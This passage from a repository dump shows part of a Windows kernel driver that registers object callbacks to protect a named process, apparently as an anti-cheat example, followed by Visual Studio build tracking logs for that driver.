NTSTATUS TdControlUnprotect(IN PDEVICE_OBJECT  DeviceObject, IN PIRP  Irp) {
	NTSTATUS Status = STATUS_SUCCESS;

	UNREFERENCED_PARAMETER(DeviceObject);
	UNREFERENCED_PARAMETER(Irp);

	// do not filter requested access
	Status = TdDeleteProtectNameCallback();
	if (Status != STATUS_SUCCESS) {
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "ObCallbackTest: TdDeleteProtectNameCallback:  status 0x%x\n", Status);
	}
	TdbProtectName = FALSE;

	//Exit:
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "ObCallbackTest: TD_IOCTL_UNPROTECT: exiting - status 0x%x\n", Status);

	return Status;
}

NTSTATUS TdDeviceControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP  Irp) {
	PIO_STACK_LOCATION IrpStack;
	ULONG Ioctl;
	NTSTATUS Status;

	UNREFERENCED_PARAMETER(DeviceObject);

	Status = STATUS_SUCCESS;

	IrpStack = IoGetCurrentIrpStackLocation(Irp);
	Ioctl = IrpStack->Parameters.DeviceIoControl.IoControlCode;

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "TdDeviceControl: entering - ioctl code 0x%x\n", Ioctl);

	switch (Ioctl) {
	case TD_IOCTL_PROTECT_NAME_CALLBACK:

		Status = TdControlProtectName(DeviceObject, Irp);
		break;

	case TD_IOCTL_UNPROTECT_CALLBACK:

		Status = TdControlUnprotect(DeviceObject, Irp);
		break;

	default:
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "TdDeviceControl: unrecognized ioctl code 0x%x\n", Ioctl);
		break;
	}

	Irp->IoStatus.Status = Status;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "TdDeviceControl leaving - status 0x%x\n", Status);
	return Status;
}

NTSTATUS TdDeviceCreate(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS TdDeviceClose(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS TdDeviceCleanup(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	NTSTATUS Status;
	UNICODE_STRING NtDeviceName = RTL_CONSTANT_STRING(TD_NT_DEVICE_NAME);
	UNICODE_STRING DosDevicesLinkName = RTL_CONSTANT_STRING(TD_DOS_DEVICES_LINK_NAME);
	PDEVICE_OBJECT Device = NULL;
	BOOLEAN SymLinkCreated = FALSE;
	USHORT CallbackVersion;

	UNREFERENCED_PARAMETER(RegistryPath);

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "ObCallbackTest: DriverEntry: Driver loaded.");

	CallbackVersion = ObGetFilterVersion();

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "ObCallbackTest: DriverEntry: Callback version 0x%hx\n", CallbackVersion);

	// Create our device object.

	Status = IoCreateDevice(
		DriverObject,                 // pointer to driver object
		0,                            // device extension size
		&NtDeviceName,                // device name
		FILE_DEVICE_UNKNOWN,          // device type
		0,                            // device characteristics
		FALSE,                        // not exclusive
		&Device);                     // returned device object pointer

	if (!NT_SUCCESS(Status)) {
		goto Exit;
	}

	NT_ASSERT(Device == DriverObject->DeviceObject);

	DriverObject->MajorFunction[IRP_MJ_CREATE] = TdDeviceCreate;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = TdDeviceClose;
	DriverObject->MajorFunction[IRP_MJ_CLEANUP] = TdDeviceCleanup;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = TdDeviceControl;
	DriverObject->DriverUnload = TdDeviceUnload;

	Status = IoCreateSymbolicLink(&DosDevicesLinkName, &NtDeviceName);

	if (!NT_SUCCESS(Status)) {
		goto Exit;
	}

	SymLinkCreated = TRUE;

Exit:
	if (!NT_SUCCESS(Status)) {
		if (SymLinkCreated == TRUE) {
			IoDeleteSymbolicLink(&DosDevicesLinkName);
		}

		if (Device != NULL) {
			IoDeleteDevice(Device);
		}
	}

	return Status;
}
```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/driver.h`:

```h
#pragma once



```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/CL.command.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\DRIVER.C
/c /IX64\DEBUG\ /Zi /nologo /W4 /WX /diagnostics:classic /Od /Oi /Oy- /D _WIN64 /D _AMD64_ /D AMD64 /D DEPRECATE_DDK_FUNCTIONS=1 /D MSC_NOOPT /D _WIN32_WINNT=0x0A00 /D WINVER=0x0A00 /D WINNT=1 /D NTDDI_VERSION=0x0A000005 /D DBG=1 /D KMDF_VERSION_MAJOR=1 /D KMDF_VERSION_MINOR=15 /GF /Gm- /Zp8 /GS /guard:cf /Gy /fp:precise /Zc:wchar_t- /Zc:forScope /Zc:inline /GR- /Fo"X64\DEBUG\\" /Fd"X64\DEBUG\VC141.PDB" /Gz /wd4748 /wd4603 /wd4627 /wd4986 /wd4987 /wd4996 /FI"C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\WARNING.H" /FC /kernel -cbstring -d2epilogunwind /d1import_no_registry /d2AllowCompatibleILVersions /d2Zi+ /Qspectre  C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\DRIVER.C

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/CL.read.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\DRIVER.C
C:\PROGRAM FILES (X86)\MICROSOFT VISUAL STUDIO\2017\PROFESSIONAL\VC\TOOLS\MSVC\14.14.26428\BIN\HOSTX86\X64\1033\CLUI.DLL
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS
C:\WINDOWS\SYSTEM32\TZRES.DLL
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\WARNING.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\SUPPRESS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\KM\NTDDK.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\KM\WDM.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\KM\CRT\EXCPT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\KM\CRT\CRTDEFS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\SPECSTRINGS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\SAL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\CONCURRENCYSAL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\SPECSTRINGS_STRICT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\SPECSTRINGS_UNDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\DRIVERSPECS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\SDV_DRIVERSPECS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\KM\CRT\VADEFS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\NTDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\KM\CRT\CTYPE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\WINAPIFAMILY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\WINPACKAGEFAMILY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\KERNELSPECS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\BASETSD.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\GUIDDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\KM\CRT\STRING.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\SDKDDKVER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\NTSTATUS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\BUGCODES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\NTIOLOGC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\KM\MCE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\PSHPACK4.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\POPPACK.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\PSHPACK1.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\DPFILTER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\APISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\KTMTYPES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\EVNTPROV.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\DEVPROPDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFTYPES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFGLOBALS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFFUNCENUM.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFSTATUS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFASSERT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFVERIFIER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFPOOL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFOBJECT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFSYNC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFCORE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFDRIVER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFQUERYINTERFACE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFMEMORY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFCHILDLIST.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFFILEOBJECT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFDEVICE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\KM\WDMSEC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFCOLLECTION.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFDPC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFTIMER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFWORKITEM.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFINTERRUPT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFRESOURCE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFREQUEST.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFIOTARGET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFIO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFFDO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFPDO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFCONTROL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFWMI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFSTRING.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFREGISTRY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFDMAENABLER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFDMATRANSACTION.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFCOMMONBUFFER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFBUGCODES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFROLETYPES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFHWACCESS.H
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\DRIVER.H

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/CL.write.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\DRIVER.C
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\VC141.PDB
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\DRIVER.OBJ

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/Inf2Cat.command.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
/os:10_x64 /driver:C:\Users\marius\git\MemWars\AntiCheatMethods\ObRegisterCallbacksDriver\x64\Debug\ObRegisterCallbacksDriver\ /driver: /os:10_x64 C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/ObRegisterCallbacksDriver.lastbuildstate`:

```lastbuildstate
#TargetFrameworkVersion=v4.5:PlatformToolSet=WindowsKernelModeDriver10.0:EnableManagedIncrementalBuild=false:VCToolArchitecture=Native32Bit:WindowsTargetPlatformVersion=10.0.17134.0
Debug|x64|C:\Users\marius\git\MemWars\AntiCheatMethods\ObRegisterCallbacksDriver\|

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.11244.read.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.inf" "C:\Users\marius\AppData\Local\Temp\WST\4a44c920-cff8-4f2b-9c54-c97aa0f4c2e2\001"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.11244.write.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.inf" "C:\Users\marius\AppData\Local\Temp\WST\4a44c920-cff8-4f2b-9c54-c97aa0f4c2e2\001"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.12756.read.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.sys" "C:\Users\marius\AppData\Local\Temp\WST\7904569e-cb09-4e26-9a5a-2f122620dc8f\002"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.SYS
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.12756.write.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.sys" "C:\Users\marius\AppData\Local\Temp\WST\7904569e-cb09-4e26-9a5a-2f122620dc8f\002"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.1908.read.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.sys" "C:\Users\marius\AppData\Local\Temp\WST\c0efd359-a3ef-4449-97c6-7ab15bca6f5e\002"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.SYS
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.1908.write.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.sys" "C:\Users\marius\AppData\Local\Temp\WST\c0efd359-a3ef-4449-97c6-7ab15bca6f5e\002"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.2868.read.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.inf" "C:\Users\marius\AppData\Local\Temp\WST\c0efd359-a3ef-4449-97c6-7ab15bca6f5e\001"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.2868.write.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.inf" "C:\Users\marius\AppData\Local\Temp\WST\c0efd359-a3ef-4449-97c6-7ab15bca6f5e\001"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.2936.read.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.inf" "C:\Users\marius\AppData\Local\Temp\WST\debfb5c9-a0a5-4366-a41e-b13fa7ec6014\001"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.2936.write.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.inf" "C:\Users\marius\AppData\Local\Temp\WST\debfb5c9-a0a5-4366-a41e-b13fa7ec6014\001"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.3744.read.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.inf" "C:\Users\marius\AppData\Local\Temp\WST\7904569e-cb09-4e26-9a5a-2f122620dc8f\001"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.3744.write.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.inf" "C:\Users\marius\AppData\Local\Temp\WST\7904569e-cb09-4e26-9a5a-2f122620dc8f\001"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.6784.read.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.inf" "C:\Users\marius\AppData\Local\Temp\WST\b5a360dc-00e9-4e03-9d78-a5e532b451b6\001"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.6784.write.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.inf" "C:\Users\marius\AppData\Local\Temp\WST\b5a360dc-00e9-4e03-9d78-a5e532b451b6\001"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.6812.read.1.tlog`:

```tlog
